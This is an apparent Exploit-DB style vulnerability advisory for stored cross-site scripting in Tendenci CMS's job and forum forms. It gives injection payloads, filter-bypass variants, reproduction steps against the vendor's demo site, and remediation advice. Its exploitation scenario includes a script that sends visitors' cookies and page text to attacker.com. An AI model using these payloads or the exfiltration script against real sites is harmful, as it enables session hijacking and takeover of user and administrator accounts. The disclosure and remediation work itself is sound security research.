\# Exploit Title: Stored Cross-Site Scripting (XSS) in Tendenci CMS - Jobs Add \& Forums New Topic

\# Date: 2025-10-16

\# Exploit Author: Emirhan Yücel

\# Vendor Homepage: https://www.tendenci.com

\# Software Link: https://github.com/tendenci/tendenci

\# Demo: https://demo.tendenci.com/

\# Version: 15.3.7 (Latest) 

\# Tested on: Windows 11

\# CVE: Pending Assignment

\# Category: webapps



\# ===================================================================

\# 1. VULNERABILITY DESCRIPTION

\# ===================================================================



Multiple STORED (Persistent) Cross-Site Scripting (XSS) vulnerabilities 

exist in Tendenci CMS. User-supplied input is stored in the database 

without proper sanitization and rendered to ALL users without output 

encoding, allowing attackers to inject malicious JavaScript that 

persistently executes in ALL victims' browsers who view the affected 

content.



CRITICAL: This is a STORED XSS, not reflected. The malicious payload:

\- Is permanently saved to the database

\- Executes automatically for EVERY user who views the content

\- Requires NO interaction from the attacker after initial injection

\- Persists across sessions, users, and page reloads

\- Affects both regular users and administrators



\# ===================================================================

\# 2. AFFECTED COMPONENTS

\# ===================================================================



\[\*] Jobs Module - Add Job Form

&nbsp;   URL: https://demo.tendenci.com/jobs/add

&nbsp;   Vulnerable Parameters:

&nbsp;   - Job title

&nbsp;   - URL Path

&nbsp;   - Description

&nbsp;   - Job URL

&nbsp;   - Other free-text fields

&nbsp;   

&nbsp;   Impact: Stored XSS payload executes for ALL users who:

&nbsp;   - View job listings page

&nbsp;   - Click on the specific job posting

&nbsp;   - Browse jobs in any category

&nbsp;   - Access admin panel to moderate jobs



\[\*] Forums Module - New Topic Form

&nbsp;   URL: https://demo.tendenci.com/forums/c/general-topics/opportunities-for-members

&nbsp;   Vulnerable Parameters:

&nbsp;   - Subject

&nbsp;   - Message body

&nbsp;   

&nbsp;   Impact: Stored XSS payload executes for ALL users who:

&nbsp;   - View the forum category

&nbsp;   - Click on the topic

&nbsp;   - Browse forum listings

&nbsp;   - Receive email notifications with topic preview

&nbsp;   - Access admin moderation panel



\# ===================================================================

\# IMPORTANT NOTE - SYSTEMIC VULNERABILITY

\# ===================================================================



This vulnerability is NOT limited to these two modules only. The same 

STORED XSS vulnerability has been identified in many other user input 

fields tested throughout the application:



\- Events module (event creation forms)

\- Articles module (article creation)

\- Pages module (page editing)

\- News module (news posting)

\- Other form fields across the application



The above examples are provided as REPRESENTATIVE samples to demonstrate 

the systemic nature of the vulnerability.



PERSISTENCE CONFIRMED: All injected payloads remain in the database and 

execute automatically every time any user (including administrators) views 

the affected content. This affects EVERY page load, EVERY user session, 

indefinitely until manually removed from the database.



A comprehensive security audit of ALL user input fields is strongly 

recommended.



\# ===================================================================

\# 3. PROOF OF CONCEPT

\# ===================================================================



\[+] PoC #1: Jobs Module - STORED XSS

------------------------------------

Target: /jobs/add



Payload:

"><script>alert('XSS by '+document.domain)</script>



Steps to Reproduce:

1\. Navigate to https://demo.tendenci.com/jobs/add

2\. In the "Job title" field, paste the payload above

3\. Fill in other required fields (if any)

4\. Click "Submit" or "Save"

5\. XSS is now STORED in the database

6\. Navigate to the job listings page or view the job detail page

7\. Payload executes AUTOMATICALLY



Verification of Persistent Storage:

1\. Log out completely

2\. Open a new incognito/private browser window

3\. Log in as a different user (or browse as guest if allowed)

4\. Navigate to the same job listing

5\. XSS still executes - confirming it's stored in database



Alternative Payloads (if <script> is filtered):

"><svg/onload=alert(1)>

"><img src=x onerror=alert(document.cookie)>

'><iframe onload=alert(1)>

<body onload=alert(1)>





\[+] PoC #2: Forums Module - STORED XSS

--------------------------------------

Target: /forums/c/general-topics/opportunities-for-members



Payload:

"><script>alert(document.cookie)</script>



Steps to Reproduce:

1\. Navigate to forum category page

2\. Click "New Topic" button

3\. In the "Subject" field OR "Message" field, paste the payload

4\. Submit the topic

5\. XSS is now STORED in the database

6\. ANY user who views the forum category or clicks the topic executes the payload

7\. Payload executes AUTOMATICALLY for all viewers



Verification of Persistent Storage:

1\. Open the forum in a different browser or incognito mode

2\. Browse to the same category

3\. XSS executes without any user interaction

4\. Every subsequent page load triggers the payload again



\# ===================================================================

\# 4. IMPACT

\# ===================================================================



STORED XSS represents a CRITICAL security risk with severe impact:



Successful exploitation allows attackers to:



\[\*] Mass Cookie Theft: ALL users viewing the content have their session 

&nbsp;   cookies stolen automatically

\[\*] Persistent Backdoor: Attacker maintains access as long as malicious 

&nbsp;   content remains stored

\[\*] XSS Worm Potential: Can create self-replicating XSS that spreads 

&nbsp;   across the application

\[\*] Administrator Compromise: When admin views the content, their 

&nbsp;   privileged session is compromised

\[\*] Mass Phishing: Injected forms/content appear legitimate to all users

\[\*] Keylogging: Can capture credentials from multiple victims

\[\*] Drive-by Downloads: Can serve malware to all viewers

\[\*] Persistent Defacement: UI manipulation affecting all visitors



Attack Scenarios:

1\. Attacker posts malicious job listing with cookie stealer

2\. HR department reviews applications → sessions hijacked

3\. Admin checks pending jobs → full admin access compromised

4\. Job seekers browse listings → mass cookie theft

5\. Payload remains active indefinitely → continuous compromise



Risk Level:

\- Jobs Module: HIGH (Public-facing, persistent, affects all viewers)

\- Forums Module: CRITICAL (User-generated content, wide audience, admin access)



CVSS v3.1 Score: 8.1 (HIGH)

Vector: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N



\# ===================================================================

\# 5. REMEDIATION

\# ===================================================================



IMMEDIATE ACTIONS REQUIRED:



\[1] Output Encoding (CRITICAL)

&nbsp;   - HTML entity encode ALL user input before rendering

&nbsp;   - Use context-appropriate encoding (HTML, attribute, JavaScript)

&nbsp;   - Never trust data from database - always encode on output

&nbsp;   - Apply encoding at the VIEW layer, not just on input



\[2] Input Sanitization (HIGH PRIORITY)

&nbsp;   - Implement server-side allowlist for HTML tags

&nbsp;   - Remove dangerous attributes (onclick, onerror, onload, etc.)

&nbsp;   - Use libraries like DOMPurify or Bleach

&nbsp;   - Sanitize BEFORE storing in database



\[3] Content Security Policy (IMMEDIATE)

&nbsp;   - Implement strict CSP headers

&nbsp;   - Disable inline scripts entirely

&nbsp;   - Example: Content-Security-Policy: default-src 'self'; script-src 'self'



\[4] Security Headers

&nbsp;   - X-Content-Type-Options: nosniff

&nbsp;   - X-Frame-Options: DENY

&nbsp;   - X-XSS-Protection: 1; mode=block



\[5] Framework-Level Protection

&nbsp;   - Enable auto-escaping in Django templates

&nbsp;   - NEVER use |safe filter without sanitization

&nbsp;   - Review all uses of mark\_safe()

&nbsp;   - Use {% autoescape on %} in all templates



\[6] Database Cleanup (URGENT)

&nbsp;   - Scan existing database for malicious scripts

&nbsp;   - Remove any stored XSS payloads

&nbsp;   - Sanitize all existing user-generated content

&nbsp;   - Consider database backup before cleanup



\[7] Web Application Firewall

&nbsp;   - Implement WAF rules to detect XSS patterns

&nbsp;   - Monitor for suspicious script injections

&nbsp;   - Rate limit content creation endpoints



\# ===================================================================

\# 6. EXAMPLE EXPLOITATION SCENARIO

\# ===================================================================



Real-world attack scenario demonstrating STORED XSS impact:



Step 1 - Initial Injection:

Attacker creates malicious job posting:



Job Title: Senior Developer

Description: "><script>

&nbsp; fetch('https://attacker.com/steal', {

&nbsp;   method: 'POST',

&nbsp;   body: JSON.stringify({

&nbsp;     cookies: document.cookie,

&nbsp;     url: location.href,

&nbsp;     user: document.body.innerText

&nbsp;   })

&nbsp; });

</script>



Step 2 - Automatic Propagation:

\- Job is now live on the website

\- EVERY visitor to job listings page is compromised

\- No user action required - payload runs automatically



Step 3 - Admin Compromise:

\- HR manager logs in to review job applications

\- Views the job listing in admin panel

\- Admin session cookie is stolen

\- Attacker receives: sessionid=abc123; csrftoken=xyz789; is\_staff=true



Step 4 - Full System Compromise:

\- Attacker uses stolen admin cookie

\- Gains full administrative access

\- Can create more malicious content

\- Can access sensitive user data

\- Can modify system settings



Step 5 - Persistence:

\- Original payload remains in database

\- Continues to compromise new victims

\- Self-perpetuating attack vector

\- Remains until manually discovered and removed



\# ===================================================================

\# 7. DISCLOSURE TIMELINE

\# ===================================================================



2025-10-16: Vulnerability discovered and verified

2025-10-16: Public disclosure (GitHub/Exploit-DB)



Note: Immediate public disclosure due to severity and demo site availability.

Responsible disclosure to vendor is recommended before production exploitation.



\# ===================================================================

\# 8. REFERENCES

\# ===================================================================



\[1] OWASP XSS Prevention Cheat Sheet

&nbsp;   https://cheatsheetseries.owasp.org/cheatsheets/Cross\_Site\_Scripting\_Prevention\_Cheat\_Sheet.html



\[2] CWE-79: Improper Neutralization of Input During Web Page Generation

&nbsp;   https://cwe.mitre.org/data/definitions/79.html



\[3] CWE-80: Improper Neutralization of Script-Related HTML Tags

&nbsp;   https://cwe.mitre.org/data/definitions/80.html



\[4] OWASP Stored XSS

&nbsp;   https://owasp.org/www-community/attacks/xss/#stored-xss-attacks



\[5] Tendenci GitHub Repository

&nbsp;   https://github.com/tendenci/tendenci



\[6] CVSS v3.1 Calculator

&nbsp;   https://www.first.org/cvss/calculator/3.1



\# ===================================================================

\# 9. DISCLAIMER

\# ===================================================================



This exploit is provided for educational and security research purposes only.

The author is not responsible for any misuse or damage caused by this exploit.

Always obtain proper authorization before testing for vulnerabilities.



This vulnerability was discovered on a publicly accessible demo instance.

Testing on production systems without authorization is illegal.



\# ===================================================================

